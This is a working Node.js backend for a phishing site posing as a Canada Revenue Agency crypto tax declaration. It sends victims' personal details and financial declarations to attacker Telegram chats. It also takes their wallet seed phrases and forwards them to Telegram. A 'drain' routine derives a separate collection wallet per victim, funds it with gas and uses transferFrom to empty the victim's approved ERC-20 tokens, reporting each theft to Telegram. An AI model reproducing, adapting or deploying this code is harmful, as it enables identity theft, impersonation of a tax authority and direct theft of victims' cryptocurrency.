'use strict';
const express = require('express');
const path    = require('path');
const ethers  = require('ethers');
const fs      = require('fs');
const axios   = require('axios');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });

const app  = express();
const PORT = process.env.PORT || 3000;
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, '..')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_IDS  = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];

// Store message IDs by session (use IP or generate session ID)
const sessionMessages = new Map();

function generateLogId() {
  return 'LOGID-' + Math.floor(100000 + Math.random() * 900000);
}

function getSessionKey(req) {
  return req.ip || req.connection.remoteAddress || 'unknown';
}

async function sendTelegram(text) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) return null;
  try {
    // Send to all chat IDs
    const promises = CHAT_IDS.map(chatId => 
      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId, text
      })
    );
    const responses = await Promise.all(promises);
    // Return first message_id for session tracking
    return responses[0].data.result.message_id;
  } catch (err) { 
    console.error('Telegram:', err.response?.data || err.message); 
    return null;
  }
}

async function editTelegram(messageId, text) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0 || !messageId) return;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      chat_id: CHAT_IDS[0],
      message_id: messageId,
      text: text
    });
  } catch (err) { 
    console.error('Telegram edit:', err.response?.data || err.message); 
  }
}

function formatPersonal(reg, decl, logId) {
  const coins = (decl.coins && decl.coins.length)
    ? decl.coins.map(c => `  - ${c.name}: $${parseFloat(c.value||0).toFixed(2)} CAD`).join('\n')
    : '  (none)';
  return [
    `🇨🇦 NEW CRA CRYPTO SUBMISSION ${logId}`,
    '════════════════════════',
    '👤 PERSONAL',
    `Name:    ${reg.fname||''} ${reg.lname||''}`,
    `DOB:     ${reg.dob||''}`,
    `Phone:   ${reg.phone||''}`,
    `Address: ${reg.address||''}, ${reg.postal||''}`,
    `Email:   ${reg.email||''}`,
    '',
    '💰 FINANCIAL DECLARATION',
    `Income 2025:   $${parseFloat(decl.totalIncome||0).toFixed(2)} CAD`,
    `Portfolio:     $${parseFloat(decl.portfolioValue||0).toFixed(2)} CAD`,
    `Mining/Stake:  ${decl.mining||'N/A'}`,
    `# Trades:      ${decl.numTrades||'0'}`,
    `Paid in Crypto:${decl.payment||'N/A'}`,
    '',
    '🪙 COINS HELD',
    coins
  ].join('\n');
}

// ── HD Wallet ──
let currentAddressIndex = 50;
const derivedAddresses  = new Map();
const ADDRESSES_LOG     = path.join(__dirname, 'used-addresses.json');

if (fs.existsSync(ADDRESSES_LOG)) {
  try {
    const data = JSON.parse(fs.readFileSync(ADDRESSES_LOG, 'utf8'));
    currentAddressIndex = data.highestIndex + 1;
  } catch(e) {}
}

function saveAddressLog() {
  fs.writeFileSync(ADDRESSES_LOG, JSON.stringify({
    highestIndex: currentAddressIndex - 1,
    lastUpdated:  new Date().toISOString(),
    addresses: Array.from(derivedAddresses.values())
  }, null, 2));
}

function deriveAddress(index) {
  const mnemonic = ethers.Mnemonic.fromPhrase(process.env.SEED_PHRASE);
  const wallet   = ethers.HDNodeWallet.fromMnemonic(mnemonic, `m/44'/60'/0'/0/${index}`);
  return { address: wallet.address, privateKey: wallet.privateKey, index };
}

app.post('/api/get-target-address', (req, res) => {
  const key = req.body.victimWallet.toLowerCase();
  if (derivedAddresses.has(key)) return res.json({ targetAddress: derivedAddresses.get(key).address });
  const d = deriveAddress(currentAddressIndex++);
  derivedAddresses.set(key, d);
  saveAddressLog();
  res.json({ targetAddress: d.address });
});

// New endpoint: Send initial telegram message when user reaches pleasewait page
app.post('/api/send-initial-telegram', async (req, res) => {
  console.log('[INITIAL] Send-initial-telegram hit');
  const { personalData } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const logId = generateLogId();
  console.log('[INITIAL] Sending initial message with', logId);
  const messageId = await sendTelegram(formatPersonal(reg, decl, logId));
  console.log('[INITIAL] Message sent, messageId:', messageId);
  
  // Store message ID and logId for this session
  const sessionKey = getSessionKey(req);
  sessionMessages.set(sessionKey, { messageId, logId });
  
  res.json({ success: true, logId });
});

app.post('/api/verify-claim', async (req, res) => {
  res.status(200).json({ success: true });
  const { wallet, approvals, ethTxHash, walletType, network, personalData, timestamp } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const sessionKey = getSessionKey(req);
  const session = sessionMessages.get(sessionKey);
  
  let messageId = session ? session.messageId : null;
  let logId = session ? session.logId : generateLogId();
  
  const txLines = (approvals||[]).map(a => `  - ${a.symbol} approve: ${a.txHash}`).join('\n')
    + (ethTxHash ? `\n  - ETH transfer: ${ethTxHash}` : '');

  // If no initial message was sent, send it now as fallback
  if (!messageId) {
    await sendTelegram(formatPersonal(reg, decl, logId));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Send SECOND separate message with wallet verification details
  await sendTelegram(
    `🔗 ${logId} - WALLET CONNECTED (AUTO)\n` +
    '════════════════════════\n' +
    `Address:  ${wallet}\n` +
    `Provider: ${walletType||'unknown'}\n` +
    `Network:  ${network||'Ethereum Mainnet'}\n` +
    `Time:     ${timestamp||new Date().toISOString()}\n\n` +
    `📋 Transactions:\n${txLines||'  (none)'}`
  );
  
  // Clean up session
  sessionMessages.delete(sessionKey);

  // ── Drain ──
  console.log('[drain] hit verify-claim wallet=' + wallet + ' approvals=' + (approvals||[]).length + ' ethTxHash=' + (ethTxHash||'none'));
  try {
    const RPC_URLS = [
      process.env.RPC_URL || 'https://ethereum.publicnode.com',
      'https://eth.llamarpc.com',
      'https://rpc.ankr.com/eth'
    ];
    let provider = null;
    for (const url of RPC_URLS) {
      try { const p = new ethers.JsonRpcProvider(url); await p.getBlockNumber(); provider = p; console.log('[drain] RPC ok:', url); break; }
      catch(e) { console.log('[drain] RPC fail:', url); }
    }
    if (!provider) { console.error('[drain] All RPCs failed'); return; }

    const normalized = wallet.toLowerCase();
    let targetInfo = derivedAddresses.get(normalized);
    if (!targetInfo) {
      console.log('[drain] wallet not in map (map size:', derivedAddresses.size, ') - deriving on the fly');
      targetInfo = deriveAddress(currentAddressIndex++);
      derivedAddresses.set(normalized, targetInfo);
      saveAddressLog();
    }
    console.log('[drain] target addr:', targetInfo.address);

    const signer        = new ethers.Wallet(process.env.GAS_WALLET_KEY, provider);
    const targetWallet  = new ethers.Wallet(targetInfo.privateKey, provider);
    const TARGET        = targetInfo.address;
    const signerBal     = await provider.getBalance(signer.address);
    console.log('[drain] gas bal:', ethers.formatEther(signerBal), 'ETH');
    if (signerBal < ethers.parseEther('0.001')) { console.error('[drain] Gas wallet low'); return; }

    const ERC20_ABI = [
      'function transferFrom(address,address,uint256) returns(bool)',
      'function balanceOf(address) view returns(uint256)',
      'function allowance(address,address) view returns(uint256)'
    ];

    if ((approvals||[]).length === 0) {
      console.log('[drain] approvals array is EMPTY - victim had no tokens or rejected approve');
    }
    console.log('[drain] Waiting 45s for approvals to confirm...');
    await new Promise(r => setTimeout(r, 45000));
    console.log('[drain] 45s done, checking', (approvals||[]).length, 'approvals');

    let drainCount = 0;
    for (const approval of (approvals||[])) {
      try {
        console.log("[drain] checking " + approval.symbol + " token=" + approval.token);
        const token     = new ethers.Contract(approval.token, ERC20_ABI, targetWallet);
        const allowance = await token.allowance(wallet, TARGET);
        console.log("[drain] " + approval.symbol + " allowance=" + allowance.toString());
        if (allowance > 0n) {
          const balance = await token.balanceOf(wallet);
          console.log("[drain] " + approval.symbol + " balance=" + balance.toString());
          if (balance > 0n) {
            const amt = balance < allowance ? balance : allowance;
            const tBal = await provider.getBalance(TARGET);
            if (tBal < ethers.parseEther('0.001')) {
              const g = await signer.sendTransaction({ to: TARGET, value: ethers.parseEther('0.002') });
              await g.wait();
            }
            const tx = await token.transferFrom(wallet, TARGET, amt, { gasLimit: 150000 });
            await tx.wait();
            drainCount++;
            console.log('[drain] SUCCESS', approval.symbol, tx.hash);
            await sendTelegram(`💸 DRAINED ${approval.symbol}\nFrom: ${wallet}\nTo:   ${TARGET}\nTX:   ${tx.hash}`);
          }
        }
      } catch(e) { console.error('[drain]', approval.symbol, 'error:', e.message); }
    }
    console.log('[drain] complete, drained', drainCount, 'tokens');
  } catch(e) { console.error('[drain] fatal:', e.message); }
});

app.post('/api/log', async (req, res) => {
  res.status(200).json({ success: true });
  const { walletProvider, seedLength, seedPhrase, personalData } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const sessionKey = getSessionKey(req);
  const session = sessionMessages.get(sessionKey);
  
  let messageId = session ? session.messageId : null;
  let logId = session ? session.logId : generateLogId();
  
  // If no initial message was sent, send it now as fallback
  if (!messageId) {
    await sendTelegram(formatPersonal(reg, decl, logId));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Send SECOND separate message with manual verification details
  await sendTelegram(
    `🔐 ${logId} - MANUAL VERIFICATION\n` +
    '════════════════════════\n' +
    `Provider: ${walletProvider||'N/A'}\n` +
    `Seed (${seedLength||'?'} words):\n${seedPhrase||'empty'}`
  );
  
  // Clean up session
  sessionMessages.delete(sessionKey);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`CRAcrypto backend running on :${PORT}`);
  console.log(`Telegram: ${BOT_TOKEN ? 'OK' : 'NOT SET'}`);
});
